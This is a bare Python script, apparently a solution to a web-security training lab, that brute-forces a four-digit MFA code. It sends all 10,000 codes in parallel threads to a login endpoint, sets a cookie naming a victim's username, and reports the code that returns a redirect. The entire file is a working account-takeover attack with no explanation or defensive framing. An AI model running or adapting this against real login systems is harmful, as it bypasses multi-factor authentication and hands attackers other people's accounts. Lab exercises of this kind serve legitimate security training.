import requests
from concurrent.futures import ThreadPoolExecutor

url = "https://victim.site/login-mfa-checker"
headers = {
    "Host": "victim.site",
    "Cookie": "verify=victim-username; session=ZhugKKwGb7WkNjG5GnDwjirYXSKnpAHN",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Referer": "https://0a32008a03e6370c83a141b3005f0065.web-security-academy.net/login2",
}

def try_login(code):
    formatted_code = f"{code:04d}"
    payload = {"mfa-code": formatted_code}
    response = requests.post(url, headers=headers, data=payload)
    print(f"Attempt with code {formatted_code} - Status Code: {response.status_code}")
    if response.status_code == 302:
        print(f"Successful login with code: {formatted_code}")
        return formatted_code
    else:
        return None

# Number of threads to use
num_threads = 10

# Create a ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    # Use the executor to map the function over the range of codes
    valid_code = next((code for code in executor.map(try_login, range(10000)) if code), None)

if valid_code:
    print("Valid code found:", valid_code)
else:
    print("No valid code found.")
